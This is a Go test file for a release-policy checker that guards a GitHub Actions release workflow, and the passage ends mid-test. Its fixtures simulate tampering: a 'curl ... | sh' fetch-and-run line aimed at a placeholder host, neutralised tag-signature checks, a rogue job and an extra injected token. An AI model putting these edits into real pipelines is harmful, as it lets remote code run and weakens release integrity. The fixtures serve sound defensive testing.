package main

import (
	"maps"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestCurrentRepositoryReleasePolicy(t *testing.T) {
	repoRoot := filepath.Join("..", "..")
	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) > 0 {
		for _, finding := range findings {
			t.Errorf("%s: %s", finding.path, finding.msg)
		}
	}
}

func TestAcceptedReleasePolicyCatalogueIsComplete(t *testing.T) {
	if acceptedReleasePolicy.workflowName == "" {
		t.Fatal("workflow name is empty")
	}
	if len(acceptedReleasePolicy.rootKeys) == 0 {
		t.Fatal("root keys are empty")
	}
	if len(acceptedReleasePolicy.jobs) == 0 {
		t.Fatal("jobs are empty")
	}
	if acceptedReleasePolicy.expectedSigners == "" {
		t.Fatal("expected signers are empty")
	}
	seenJobs := map[string]bool{}
	seenConcepts := map[string]bool{}
	for _, job := range acceptedReleasePolicy.jobs {
		if job.concept == "" {
			t.Fatalf("job %q has empty policy concept", job.name)
		}
		if seenConcepts[job.concept] {
			t.Fatalf("duplicate policy concept %q", job.concept)
		}
		seenConcepts[job.concept] = true
		if job.name == "" {
			t.Fatal("job name is empty")
		}
		if job.displayName == "" {
			t.Fatalf("job %q has empty display name", job.name)
		}
		if job.runsOn == "" {
			t.Fatalf("job %q has empty runner", job.name)
		}
		if job.timeoutMinutes == "" {
			t.Fatalf("job %q has empty timeout", job.name)
		}
		if seenJobs[job.name] {
			t.Fatalf("duplicate job %q", job.name)
		}
		seenJobs[job.name] = true
		if job.ifCond == "" {
			t.Fatalf("job %q has empty if condition", job.name)
		}
		if len(job.steps) == 0 {
			t.Fatalf("job %q has no steps", job.name)
		}
		seenSteps := map[string]bool{}
		for _, step := range job.steps {
			if step.identity == "" {
				t.Fatalf("job %q has a step with empty identity", job.name)
			}
			if seenSteps[step.identity] {
				t.Fatalf("job %q has duplicate step identity %q", job.name, step.identity)
			}
			seenSteps[step.identity] = true
			if step.name == "" && step.usesPrefix == "" {
				t.Fatalf("job %q step %q has no name or action prefix", job.name, step.identity)
			}
			if step.name != "" && step.identity != step.name {
				t.Fatalf("job %q step %q identity does not match name %q", job.name, step.identity, step.name)
			}
		}
	}
	seenScripts := map[string]bool{}
	for _, path := range acceptedReleasePolicy.requiredScripts {
		if path == "" {
			t.Fatal("required script path is empty")
		}
		if seenScripts[path] {
			t.Fatalf("duplicate required script %q", path)
		}
		seenScripts[path] = true
	}
	if !seenScripts["scripts/release-tag-policy.sh"] {
		t.Fatal("accepted release policy must require scripts/release-tag-policy.sh")
	}
	if !seenScripts["scripts/release-metadata.sh"] {
		t.Fatal("accepted release policy must require scripts/release-metadata.sh")
	}
	seenConfigs := map[string]bool{}
	for _, config := range acceptedReleasePolicy.requiredConfigs {
		if config.path == "" {
			t.Fatal("required config path is empty")
		}
		if seenConfigs[config.path] {
			t.Fatalf("duplicate required config %q", config.path)
		}
		seenConfigs[config.path] = true
		if config.sourceName == "" {
			t.Fatalf("required config %q has empty source name", config.path)
		}
	}
	if !seenConfigs[".github/syft-release.yaml"] {
		t.Fatal("accepted release policy must require .github/syft-release.yaml")
	}
}

func TestAcceptedReleasePolicyCatalogueRejectsConceptDefects(t *testing.T) {
	tests := []struct {
		name   string
		mutate func(*testing.T, releasePolicy) (releasePolicy, string)
	}{
		{
			name: "empty concept",
			mutate: func(t *testing.T, policy releasePolicy) (releasePolicy, string) {
				policy.jobs[indexOfJob(t, policy, "verify-tag")].concept = ""
				return policy, "accepted release policy job must declare a policy concept"
			},
		},
		{
			name: "duplicate concept",
			mutate: func(t *testing.T, policy releasePolicy) (releasePolicy, string) {
				source := indexOfJob(t, policy, "unsupported-ref")
				target := indexOfJob(t, policy, "verify-tag")
				policy.jobs[target].concept = policy.jobs[source].concept
				return policy, "policy concept duplicates job"
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			policy, want := tt.mutate(t, cloneReleasePolicy(acceptedReleasePolicy))
			findings := checkAcceptedReleasePolicyCatalogue(policy)
			requireFinding(t, findings, "tools/releasepolicy/policy.go:accepted-release-policy.jobs.verify-tag")
			requireFinding(t, findings, want)
			for _, finding := range findings {
				if strings.Contains(finding.path, ".github/workflows/release.yml") {
					t.Fatalf("catalogue finding path points at workflow YAML: %#v", findings)
				}
			}
		})
	}
}

func TestWorkflowCheckStopsOnCatalogueIntegrityFailure(t *testing.T) {
	policy := cloneReleasePolicy(acceptedReleasePolicy)
	policy.jobs[indexOfJob(t, policy, "verify-tag")].concept = ""

	var doc yaml.Node
	if err := yaml.Unmarshal([]byte("name: one\nname: two\n"), &doc); err != nil {
		t.Fatal(err)
	}
	findings := checkWorkflowAgainstPolicy(".github/workflows/release.yml", doc.Content[0], policy)
	if len(findings) != 1 {
		t.Fatalf("findings=%#v want exactly one catalogue finding", findings)
	}
	requireFinding(t, findings, "tools/releasepolicy/policy.go:accepted-release-policy.jobs.verify-tag")
	requireFinding(t, findings, "accepted release policy job must declare a policy concept")
}

func TestWorkflowCheckUsesSuppliedPolicy(t *testing.T) {
	base := currentWorkflow(t)
	policy := cloneReleasePolicy(acceptedReleasePolicy)
	removedJob := "release"
	removed := indexOfJob(t, policy, removedJob)
	policy.jobs = append(policy.jobs[:removed], policy.jobs[removed+1:]...)

	findings := findingsForWorkflowAgainstPolicy(t, base, policy)
	requireFinding(t, findings, "jobs."+removedJob)
	requireFinding(t, findings, "unexpected job in release workflow")
}

func TestCloneReleasePolicyIsDeep(t *testing.T) {
	clone := cloneReleasePolicy(acceptedReleasePolicy)
	verifyTag := indexOfJob(t, acceptedReleasePolicy, "verify-tag")
	gosec := indexOfJob(t, acceptedReleasePolicy, "gosec")
	sbom := indexOfJob(t, acceptedReleasePolicy, "sbom")
	release := indexOfJob(t, acceptedReleasePolicy, "release")
	prepareRelease := indexOfStep(t, acceptedReleasePolicy.jobs[release], "Prepare release notes and assets")

	requireStringSliceNotAliased(t, "root keys", acceptedReleasePolicy.rootKeys, clone.rootKeys, 0, "changed")
	requireStringMapNotAliased(t, "env map", acceptedReleasePolicy.env, clone.env, "GOTOOLCHAIN", "changed")
	requireStringMapNotAliased(t, "concurrency map", acceptedReleasePolicy.concurrency, clone.concurrency, "group", "changed")
	requireStringSliceNotAliased(t, "trigger keys", acceptedReleasePolicy.triggerKeys, clone.triggerKeys, 0, "changed")
	requireStringSliceNotAliased(t, "push keys", acceptedReleasePolicy.pushKeys, clone.pushKeys, 0, "changed")
	requireStringSliceNotAliased(t, "push tags", acceptedReleasePolicy.pushTags, clone.pushTags, 0, "changed")
	requireStringMapNotAliased(t, "top permissions", acceptedReleasePolicy.topPermission, clone.topPermission, "contents", "write")
	requireStringSliceNotAliased(t, "required scripts", acceptedReleasePolicy.requiredScripts, clone.requiredScripts, 0, "changed")
	requireConfigPolicySliceNotAliased(t, acceptedReleasePolicy.requiredConfigs, clone.requiredConfigs, 0, "changed")
	syftConfig := indexOfRequiredConfig(t, acceptedReleasePolicy, ".github/syft-release.yaml")
	requireStringSliceNotAliased(t, "required config excludes", acceptedReleasePolicy.requiredConfigs[syftConfig].excludes, clone.requiredConfigs[syftConfig].excludes, 0, "changed")
	requireStringMapNotAliased(t, "job permissions", acceptedReleasePolicy.jobs[gosec].permissions, clone.jobs[gosec].permissions, "contents", "write")
	requireStringMapNotAliased(t, "job outputs", acceptedReleasePolicy.jobs[verifyTag].outputs, clone.jobs[verifyTag].outputs, "release-tag", "changed")
	requireStringSliceNotAliased(t, "job needs", acceptedReleasePolicy.jobs[sbom].needs, clone.jobs[sbom].needs, 0, "changed")
	requireStringMapNotAliased(t, "step with map", acceptedReleasePolicy.jobs[verifyTag].steps[0].with, clone.jobs[verifyTag].steps[0].with, "persist-credentials", "true")
	requireStringSliceNotAliased(t, "step run lines", acceptedReleasePolicy.jobs[verifyTag].steps[1].runLines, clone.jobs[verifyTag].steps[1].runLines, 0, "changed")
	requireStringMapNotAliased(t, "step env map", acceptedReleasePolicy.jobs[release].steps[prepareRelease].env, clone.jobs[release].steps[prepareRelease].env, "RELEASE_TAG", "changed")
}

func cloneReleasePolicy(policy releasePolicy) releasePolicy {
	policy.rootKeys = append([]string(nil), policy.rootKeys...)
	policy.env = cloneStringMap(policy.env)
	policy.concurrency = cloneStringMap(policy.concurrency)
	policy.triggerKeys = append([]string(nil), policy.triggerKeys...)
	policy.pushKeys = append([]string(nil), policy.pushKeys...)
	policy.pushTags = append([]string(nil), policy.pushTags...)
	policy.topPermission = cloneStringMap(policy.topPermission)
	policy.jobs = append([]releaseJobPolicy(nil), policy.jobs...)
	for i := range policy.jobs {
		policy.jobs[i] = cloneReleaseJobPolicy(policy.jobs[i])
	}
	policy.requiredScripts = append([]string(nil), policy.requiredScripts...)
	policy.requiredConfigs = append([]releaseConfigPolicy(nil), policy.requiredConfigs...)
	for i := range policy.requiredConfigs {
		policy.requiredConfigs[i].excludes = append([]string(nil), policy.requiredConfigs[i].excludes...)
	}
	return policy
}

func cloneReleaseJobPolicy(job releaseJobPolicy) releaseJobPolicy {
	job.needs = append([]string(nil), job.needs...)
	job.permissions = cloneStringMap(job.permissions)
	job.outputs = cloneStringMap(job.outputs)
	job.steps = append([]releaseStepPolicy(nil), job.steps...)
	for i := range job.steps {
		job.steps[i] = cloneReleaseStepPolicy(job.steps[i])
	}
	return job
}

func cloneReleaseStepPolicy(step releaseStepPolicy) releaseStepPolicy {
	step.runLines = append([]string(nil), step.runLines...)
	step.with = cloneStringMap(step.with)
	step.env = cloneStringMap(step.env)
	return step
}

func cloneStringMap(in map[string]string) map[string]string {
	if in == nil {
		return nil
	}
	out := make(map[string]string, len(in))
	maps.Copy(out, in)
	return out
}

func requireStringSliceNotAliased(t *testing.T, name string, original []string, cloned []string, index int, changed string) {
	t.Helper()
	if len(original) <= index {
		t.Fatalf("%s original has length %d, want index %d", name, len(original), index)
	}
	if len(cloned) <= index {
		t.Fatalf("%s clone has length %d, want index %d", name, len(cloned), index)
	}
	originalValue := original[index]
	clonedValue := cloned[index]
	if originalValue == changed {
		t.Fatalf("%s alias sentinel matches original value", name)
	}

	cloned[index] = changed
	if original[index] == changed {
		original[index] = originalValue
		t.Fatalf("%s aliased", name)
	}
	cloned[index] = clonedValue
}

func requireStringMapNotAliased(t *testing.T, name string, original map[string]string, cloned map[string]string, key string, changed string) {
	t.Helper()
	originalValue, ok := original[key]
	if !ok {
		t.Fatalf("%s original is missing key %q", name, key)
	}
	clonedValue, ok := cloned[key]
	if !ok {
		t.Fatalf("%s clone is missing key %q", name, key)
	}
	if originalValue == changed {
		t.Fatalf("%s alias sentinel matches original value", name)
	}

	cloned[key] = changed
	if original[key] == changed {
		original[key] = originalValue
		t.Fatalf("%s aliased", name)
	}
	cloned[key] = clonedValue
}

func requireConfigPolicySliceNotAliased(t *testing.T, original []releaseConfigPolicy, cloned []releaseConfigPolicy, index int, changed string) {
	t.Helper()
	if len(original) <= index {
		t.Fatalf("required config original has length %d, want index %d", len(original), index)
	}
	if len(cloned) <= index {
		t.Fatalf("required config clone has length %d, want index %d", len(cloned), index)
	}
	originalValue := original[index].path
	clonedValue := cloned[index].path
	if originalValue == changed {
		t.Fatal("required config alias sentinel matches original value")
	}

	cloned[index].path = changed
	if original[index].path == changed {
		original[index].path = originalValue
		t.Fatal("required config slice aliased")
	}
	cloned[index].path = clonedValue
}

func indexOfJob(t *testing.T, policy releasePolicy, name string) int {
	t.Helper()
	for i, job := range policy.jobs {
		if job.name == name {
			return i
		}
	}
	t.Fatalf("accepted release policy is missing job %q", name)
	return -1
}

func indexOfRequiredConfig(t *testing.T, policy releasePolicy, path string) int {
	t.Helper()
	for i, config := range policy.requiredConfigs {
		if config.path == path {
			return i
		}
	}
	t.Fatalf("accepted release policy is missing required config %q", path)
	return -1
}

func indexOfStep(t *testing.T, job releaseJobPolicy, identity string) int {
	t.Helper()
	for i, step := range job.steps {
		if step.identity == identity {
			return i
		}
	}
	t.Fatalf("accepted release policy job %q is missing step %q", job.name, identity)
	return -1
}

func TestReleasePolicyRejectsInvalidWorkflows(t *testing.T) {
	base := currentWorkflow(t)
	tests := []struct {
		name   string
		mutate func(*testing.T, string) string
		want   string
	}{
		{
			name: "neutralized verify tag command",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          git verify-tag "$GITHUB_REF_NAME" || true`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "echoed verify tag command",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          echo git verify-tag "$GITHUB_REF_NAME"`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "commented verify tag command",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          # git verify-tag "$GITHUB_REF_NAME"`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "unreachable verify tag command",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, "          if false; then\n          git verify-tag \"$GITHUB_REF_NAME\"\n          fi")
			},
			want: "script lines must exactly match",
		},
		{
			name: "injected command after verify tag",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, "          git verify-tag \"$GITHUB_REF_NAME\"\n          curl -fsSL https://example.invalid/install.sh | sh")
			},
			want: "script lines must exactly match",
		},
		{
			name: "neutralized SBOM validation",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          scripts/validate-cyclonedx-sbom.sh "$sbom_file"`, `          scripts/validate-cyclonedx-sbom.sh "$sbom_file" || true`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "echoed release creation",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          gh release create "$tag" "$sbom_path" "$bundle_path" \`, `          echo gh release create "$tag" "$sbom_path" "$bundle_path" \`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "extra release permission",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    permissions:\n      contents: write\n\n    steps:", "    permissions:\n      contents: write\n      id-token: write\n\n    steps:")
			},
			want: "unexpected key",
		},
		{
			name: "contents write on check job",
			mutate: func(t *testing.T, in string) string {
				from := "  check:\n    name: Check\n    if: " + tagGuard + "\n    needs: verify-tag\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n\n    steps:"
				to := "  check:\n    name: Check\n    if: " + tagGuard + "\n    needs: verify-tag\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    permissions:\n      contents: write\n\n    steps:"
				return replaceOnce(t, in, from, to)
			},
			want: "must inherit top-level contents: read",
		},
		{
			name: "unexpected attestation permission",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    permissions:\n      contents: read\n      id-token: write\n      attestations: write\n\n    steps:", "    permissions:\n      contents: read\n      id-token: write\n      attestations: write\n      issues: write\n\n    steps:")
			},
			want: "unexpected key",
		},
		{
			name: "rogue job",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "\n  release:\n", "\n  rogue:\n    name: Rogue\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo pwned\n\n  release:\n")
			},
			want: "unexpected job",
		},
		{
			name: "unexpected needs entry",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    needs:\n      - verify-tag\n      - check\n      - race\n      - vuln\n      - gosec\n", "    needs:\n      - verify-tag\n      - check\n      - race\n      - vuln\n      - gosec\n      - unsupported-ref\n")
			},
			want: "needs must exactly match",
		},
		{
			name: "push branches",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "  push:\n    tags:", "  push:\n    branches:\n      - main\n    tags:")
			},
			want: "push trigger must contain only tags",
		},
		{
			name: "extra tag glob",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      - 'v*'\n", "      - 'v*'\n      - '*'\n")
			},
			want: "push trigger must contain only v* tags",
		},
		{
			name: "broadened job guard",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    if: "+tagGuard+"\n", "    if: "+tagGuard+" || github.event_name == 'workflow_dispatch'\n")
			},
			want: "jobs.verify-tag.if",
		},
		{
			name: "unsupported ref missing negation",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    if: "+unsupportedRefGuard+"\n", "    if: github.event_name == 'workflow_dispatch' && ("+tagGuard+")\n")
			},
			want: "jobs.unsupported-ref.if",
		},
		{
			name: "unpinned action",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0", "actions/checkout@v6")
			},
			want: "action must be pinned",
		},
		{
			name: "run expression interpolation",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "          go version", `          echo "${{ github.ref }}"`)
			},
			want: "must not interpolate",
		},
		{
			name: "missing checkout credential hardening",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "          persist-credentials: false\n", "")
			},
			want: "persist-credentials",
		},
		{
			name: "setup go action changed",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6.5.0", "uses: actions/cache@924ae3a1cded613372ab5595356fb5720e22ba16 # v6.5.0")
			},
			want: "uses must start with actions/setup-go@",
		},
		{
			name: "go environment report changed",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "          go env GOTOOLCHAIN GOPROXY GOSUMDB", "          go env GOTOOLCHAIN")
			},
			want: "go env GOTOOLCHAIN GOPROXY GOSUMDB",
		},
		{
			name: "alias valued unexpected step guard",
			mutate: func(t *testing.T, in string) string {
				out := replaceOnce(t, in, "  cancel-in-progress: false\n", "  cancel-in-progress: &skip false\n")
				return replaceOnce(t, out, "      - name: Verify tag object and signature\n        run: |", "      - name: Verify tag object and signature\n        if: *skip\n        run: |")
			},
			want: "jobs.verify-tag.steps[1].if",
		},
		{
			name: "scalar unexpected step guard",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      - name: Verify tag object and signature\n        run: |", "      - name: Verify tag object and signature\n        if: false\n        run: |")
			},
			want: "jobs.verify-tag.steps[1].if",
		},
		{
			name: "check job no longer runs tests",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        run: go test ./...", "        run: true")
			},
			want: "go test ./...",
		},
		{
			name: "race job no longer runs race tests",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        run: go test -race ./...", "        run: true")
			},
			want: "go test -race ./...",
		},
		{
			name: "vuln job no longer runs vuln scan",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        run: task vuln", "        run: true")
			},
			want: "task vuln",
		},
		{
			name: "gosec job no longer runs gosec scan",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        run: task gosec GOSEC='gosec -fmt sarif -out gosec.sarif'", "        run: true")
			},
			want: "task gosec",
		},
		{
			name: "extra release step",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      - name: Publish GitHub Release\n", "      - name: Extra release mutation\n        run: gh release upload \"$RELEASE_TAG\" \"dist/$SBOM_FILE\" --clobber\n\n      - name: Publish GitHub Release\n")
			},
			want: "steps must exactly match",
		},
		{
			name: "extra attestation step",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      - name: Attest SBOM\n", "      - name: Extra OIDC step\n        run: echo extra\n\n      - name: Attest SBOM\n")
			},
			want: "steps must exactly match",
		},
		{
			name: "gosec report guard changed",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        if: steps.gosec.outcome == 'failure'", "        if: false")
			},
			want: "jobs.gosec.steps[7].if",
		},
		{
			name: "verify tag output rewired",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      release-tag: ${{ steps.release-tag.outputs.release-tag }}", "      release-tag: ${{ github.ref_name }}")
			},
			want: "jobs.verify-tag.outputs.release-tag",
		},
		{
			name: "sbom output rewired",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      sbom-file: ${{ steps.sbom-metadata.outputs.sbom-file }}", "      sbom-file: ${{ github.ref_name }}")
			},
			want: "jobs.sbom.outputs.sbom-file",
		},
		{
			name: "attestation id changed",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        id: attest-sbom", "        id: other")
			},
			want: "jobs.sbom-attestation.steps[3].id",
		},
		{
			name: "root defaults injected",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "permissions:\n", "defaults:\n  run:\n    shell: bash\n\npermissions:\n")
			},
			want: "workflow root keys must exactly match",
		},
		{
			name: "extra publish env",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "          GH_TOKEN: ${{ github.token }}\n", "          GH_TOKEN: ${{ github.token }}\n          EXTRA_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n")
			},
			want: "unexpected key",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := findingsForWorkflow(t, tt.mutate(t, base))
			requireFinding(t, findings, tt.want)
		})
	}
}

func TestReleasePolicyRejectsDuplicateWorkflowKeys(t *testing.T) {
	base := currentWorkflow(t)
	tests := []struct {
		name     string
		mutate   func(*testing.T, string) string
		wantPath string
	}{
		{
			name: "duplicate setup-go uses",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6.5.0\n        with:", "        uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6.5.0\n        uses: actions/cache@924ae3a1cded613372ab5595356fb5720e22ba16\n        with:")
			},
			wantPath: "release.yml:jobs.check.steps[1].uses",
		},
		{
			name: "duplicate run",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        run: |\n          go version\n          go env GOTOOLCHAIN GOPROXY GOSUMDB\n", "        run: |\n          go version\n          go env GOTOOLCHAIN GOPROXY GOSUMDB\n        run: true\n")
			},
			wantPath: "release.yml:jobs.check.steps[2].run",
		},
		{
			name: "duplicate job if",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "  check:\n    name: Check\n    if: "+tagGuard+"\n", "  check:\n    name: Check\n    if: "+tagGuard+"\n    if: always()\n")
			},
			wantPath: "release.yml:jobs.check.if",
		},
		{
			name: "duplicate output",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      sbom-file: ${{ steps.release-tag.outputs.sbom-file }}\n", "      sbom-file: ${{ steps.release-tag.outputs.sbom-file }}\n      sbom-file: ${{ github.ref_name }}\n")
			},
			wantPath: "release.yml:jobs.verify-tag.outputs.sbom-file",
		},
		{
			name: "duplicate with entry",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "          cache: true\n", "          cache: true\n          cache: false\n")
			},
			wantPath: "release.yml:jobs.check.steps[1].with.cache",
		},
		{
			name: "duplicate env entry",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "          SBOM_FILE: ${{ needs.verify-tag.outputs.sbom-file }}\n", "          SBOM_FILE: ${{ needs.verify-tag.outputs.sbom-file }}\n          SBOM_FILE: other.json\n")
			},
			wantPath: "release.yml:jobs.sbom.steps[2].env.SBOM_FILE",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := findingsForWorkflow(t, tt.mutate(t, base))
			requireOnlyFinding(t, findings, tt.wantPath, "duplicate YAML key")
		})
	}
}

func TestReleasePolicyReportsMissingModeledCheckoutHardeningOnce(t *testing.T) {
	base := currentWorkflow(t)
	workflow := replaceOnce(t, base, "          persist-credentials: false\n", "")

	findings := findingsForWorkflow(t, workflow)
	if got := countFindingsContaining(findings, "persist-credentials"); got != 1 {
		t.Fatalf("expected one persist-credentials finding, got %d: %#v", got, findings)
	}
}

func TestReleasePolicyReportsMissingSBOMOutputOnce(t *testing.T) {
	base := currentWorkflow(t)
	workflow := replaceOnce(t, base, "      sbom-file: ${{ steps.sbom-metadata.outputs.sbom-file }}\n", "")

	findings := findingsForWorkflow(t, workflow)
	if got := countFindingsContaining(findings, "jobs.sbom.outputs.sbom-file"); got != 1 {
		t.Fatalf("expected one sbom-file output finding, got %d: %#v", got, findings)
	}
}

func TestReleasePolicyStillChecksCheckoutHardeningForUnexpectedJobs(t *testing.T) {
	base := currentWorkflow(t)
	workflow := replaceOnce(t, base, "\n  release:\n", "\n  rogue:\n    name: Rogue\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0\n        with: {}\n\n  release:\n")

	findings := findingsForWorkflow(t, workflow)
	requireFinding(t, findings, "jobs.rogue.steps[0].with.persist-credentials")
}

func TestReleasePolicyStopsStepValidationAfterIdentityMismatch(t *testing.T) {
	base := currentWorkflow(t)
	original := `      - name: Verify tag object and signature
        run: |
          git fetch --force origin "refs/tags/$GITHUB_REF_NAME:refs/tags/$GITHUB_REF_NAME"
          tag_type="$(git cat-file -t "$GITHUB_REF_NAME")"
          printf '%s\n' "$tag_type"
          test "$tag_type" = tag
          git config gpg.ssh.allowedSignersFile .github/allowed_signers
          git verify-tag "$GITHUB_REF_NAME"

      - name: Validate release tag metadata
        id: release-tag
        run: scripts/release-tag-metadata.sh "$GITHUB_REF_NAME" >> "$GITHUB_OUTPUT"
`
	swapped := `      - name: Validate release tag metadata
        id: release-tag
        run: scripts/release-tag-metadata.sh "$GITHUB_REF_NAME" >> "$GITHUB_OUTPUT"

      - name: Verify tag object and signature
        run: |
          git fetch --force origin "refs/tags/$GITHUB_REF_NAME:refs/tags/$GITHUB_REF_NAME"
          tag_type="$(git cat-file -t "$GITHUB_REF_NAME")"
          printf '%s\n' "$tag_type"
          test "$tag_type" = tag
          git config gpg.ssh.allowedSignersFile .github/allowed_signers
          git verify-tag "$GITHUB_REF_NAME"
`

	findings := findingsForWorkflow(t, replaceOnce(t, base, original, swapped))
	requireOnlyFinding(t, findings, "release.yml:jobs.verify-tag.steps", "steps must exactly match")
}

func TestReleasePolicyRejectsNonExecutableRequiredScripts(t *testing.T) {
	repoRoot := t.TempDir()
	writeReleasePolicyRepoFixture(t, repoRoot)
	mustChmod(t, filepath.Join(repoRoot, "scripts", "validate-cyclonedx-sbom.sh"), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	requireFinding(t, findings, "required release helper must be executable")
}

func TestReleasePolicyRejectsMissingRequiredConfig(t *testing.T) {
	repoRoot := t.TempDir()
	writeReleasePolicyRepoFixture(t, repoRoot)
	if err := os.Remove(filepath.Join(repoRoot, ".github", "syft-release.yaml")); err != nil {
		t.Fatal(err)
	}

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	requireFinding(t, findings, "missing required release config")
}

func TestReleasePolicyRejectsSymlinkRequiredConfig(t *testing.T) {
	repoRoot := t.TempDir()
	writeReleasePolicyRepoFixture(t, repoRoot)
	configPath := filepath.Join(repoRoot, ".github", "syft-release.yaml")
	targetPath := filepath.Join(repoRoot, ".github", "syft-target.yaml")
	mustWriteFile(t, targetPath, []byte(acceptedSyftReleaseConfig), 0o644)
	if err := os.Remove(configPath); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(targetPath, configPath); err != nil {
		t.Fatal(err)
	}

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	requireFinding(t, findings, "required release config must not be a symlink")
}

func TestReleasePolicyRejectsNonRegularRequiredConfig(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("unix sockets are not available on windows")
	}
	repoRoot, err := os.MkdirTemp("/tmp", "releasepolicy-")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := os.RemoveAll(repoRoot); err != nil {
			t.Error(err)
		}
	})
	writeReleasePolicyRepoFixture(t, repoRoot)
	configPath := filepath.Join(repoRoot, ".github", "syft-release.yaml")
	if err := os.Remove(configPath); err != nil {
		t.Fatal(err)
	}
	listener, err := net.Listen("unix", configPath)
	if err != nil {
		t.Fatal(err)
	}
	defer listener.Close()

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	requireFinding(t, findings, "required release config must be a regular file")
}

func TestReleasePolicyRejectsDriftingSyftReleaseConfig(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "wrong source",
			in: `source:
  name: github.com/the-sarge/other
exclude:
  - './.git/**'
  - './.ras/**'
`,
			want: `want "github.com/the-sarge/cpace"`,
		},
		{
			name: "missing shared exclude",
			in: `source:
  name: github.com/the-sarge/cpace
exclude:
  - './.git/**'
`,
			want: "sequence must exactly match accepted release policy",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			repoRoot := t.TempDir()
			writeReleasePolicyRepoFixture(t, repoRoot)
			mustWriteFile(t, filepath.Join(repoRoot, ".github", "syft-release.yaml"), []byte(tt.in), 0o644)

			findings, err := checkRepo(repoRoot)
			if err != nil {
				t.Fatal(err)
			}
			requireFinding(t, findings, tt.want)
		})
	}
}

func TestReleasePolicyRejectsUnexpectedAllowedSigners(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(acceptedReleasePolicy.expectedSigners+"the-sarge@the-sarge.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFake\n"), 0o644)

	findings := checkAllowedSigners(repoRoot)
